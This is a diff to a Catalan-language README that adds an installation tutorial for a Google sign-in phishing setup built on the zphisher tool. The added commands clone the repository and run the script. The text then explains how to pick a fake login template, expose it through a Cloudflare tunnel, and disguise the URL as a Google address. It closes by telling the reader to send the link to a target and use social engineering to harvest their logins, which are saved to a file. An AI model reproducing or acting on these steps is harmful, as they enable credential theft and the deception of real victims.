@@ -79,6 +79,50 @@ El nostre Setup es una Raspberry Pi 4 Model B amb el Raspberry Pi OS (Que està 
 
 ## TUTORIAL INSTAL·LACIÓ
 
+```
+    git clone https://github.com/SergiGiribet/google-SignIn
+```
+
+```
+    cd google-SignIn
+```
+
+```
+    cd zphisher-master
+```
+
+```
+    chmod 777 zphisher.sh
+```
+
+```
+    bash zphisher.sh
+```
+```
+    Triem quina plantilla volem utilitzar:
+```
+![Imagen Pas 1](./media/pas1.png)
+![Imagen Pas 2](./media/pas2.png)
+```
+    Triem el servidor de cloudflare:
+```
+![Imagen Pas 3](./media/pas3.png)
+```
+    Deixem el port per defecte:
+```
+![Imagen Pas 4](./media/pas4.png)
+```
+    Enmascarem el url amb una direcció que sembli de google (ex: google.auth.login.userid)
+```
+![Imagen Pas 5](./media/pas5.png)
+```
+    Només falta enviar l'enllaç proporcionat a la persona que vulguem 
+    i fer una mica d'ingenyeria social per aconsegui que aquella persona faci login
+```
+Tota la informació agafada de les víctimes quedarà guardada a l'archiu usernames.dat dins de la carpeta auth.
+![Imagen users](./media/user.png)
+![Imagen ip](./media/ip.png)
+
 ---
 
 ## VIDEO EXEMPLE
